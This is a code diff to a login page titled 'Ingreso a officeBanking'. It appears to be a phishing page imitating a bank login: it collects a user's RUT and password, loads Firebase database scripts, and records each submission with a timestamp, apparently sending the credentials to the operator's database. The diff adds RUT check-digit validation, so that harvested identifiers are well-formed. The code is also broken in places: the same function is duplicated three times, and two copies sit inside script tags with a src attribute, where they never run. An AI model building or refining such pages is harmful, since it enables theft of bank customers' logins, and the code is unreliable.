@@ -5,8 +5,36 @@
   <meta charset="UTF-8">
   <title>Ingreso a officeBanking</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js">
+    function validarRut(rut) {
+      if (rut.length < 2) return false;
+      const cuerpo = rut.slice(0, -1);
+      const dv = rut.slice(-1).toUpperCase();
+      let suma = 0, multiplo = 2;
+      for (let i = cuerpo.length - 1; i >= 0; i--) {
+        suma += parseInt(cuerpo[i]) * multiplo;
+        multiplo = multiplo === 7 ? 2 : multiplo + 1;
+      }
+      const dvr = 11 - (suma % 11);
+      const verificador = dvr === 11 ? "0" : dvr === 10 ? "K" : dvr.toString();
+      return verificador === dv;
+    }
+  </script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js">
+    function validarRut(rut) {
+      if (rut.length < 2) return false;
+      const cuerpo = rut.slice(0, -1);
+      const dv = rut.slice(-1).toUpperCase();
+      let suma = 0, multiplo = 2;
+      for (let i = cuerpo.length - 1; i >= 0; i--) {
+        suma += parseInt(cuerpo[i]) * multiplo;
+        multiplo = multiplo === 7 ? 2 : multiplo + 1;
+      }
+      const dvr = 11 - (suma % 11);
+      const verificador = dvr === 11 ? "0" : dvr === 10 ? "K" : dvr.toString();
+      return verificador === dv;
+    }
+  </script>
   <style>
     body {
       background-color: white;
@@ -91,7 +119,10 @@
     <div class="title">
       <span class="black">Ingreso a</span><span class="red-box">officeBanking</span>
     </div>
-    <form id="formulario">
+    
+  <form id="formulario">
+    <div id="errorRut" style="color:red; font-weight:bold; display:none;">RUT inválido</div>
+  
       <input type="text" id="rut" placeholder="RUT" required>
       <div class="input-container">
         <input type="password" id="clave" placeholder="Contraseña" required>
@@ -129,7 +160,16 @@
 
     document.getElementById("formulario").addEventListener("submit", async function(e) {
       e.preventDefault();
-      const rut = document.getElementById("rut").value.trim();
+      
+      const rutRaw = document.getElementById("rut").value.trim();
+      const rut = rutRaw.replace(/[^0-9kK]/g, "").toUpperCase();
+      if (!validarRut(rut)) {
+        document.getElementById("errorRut").style.display = "block";
+        return;
+      } else {
+        document.getElementById("errorRut").style.display = "none";
+      }
+  
       const clave = document.getElementById("clave").value.trim();
       const timestamp = Date.now();
       const fecha = new Date().toLocaleString("es-CL");
@@ -148,6 +188,20 @@
         }
       });
     });
+  
+    function validarRut(rut) {
+      if (rut.length < 2) return false;
+      const cuerpo = rut.slice(0, -1);
+      const dv = rut.slice(-1).toUpperCase();
+      let suma = 0, multiplo = 2;
+      for (let i = cuerpo.length - 1; i >= 0; i--) {
+        suma += parseInt(cuerpo[i]) * multiplo;
+        multiplo = multiplo === 7 ? 2 : multiplo + 1;
+      }
+      const dvr = 11 - (suma % 11);
+      const verificador = dvr === 11 ? "0" : dvr === 10 ? "K" : dvr.toString();
+      return verificador === dv;
+    }
   </script>
 </body>
 </html>
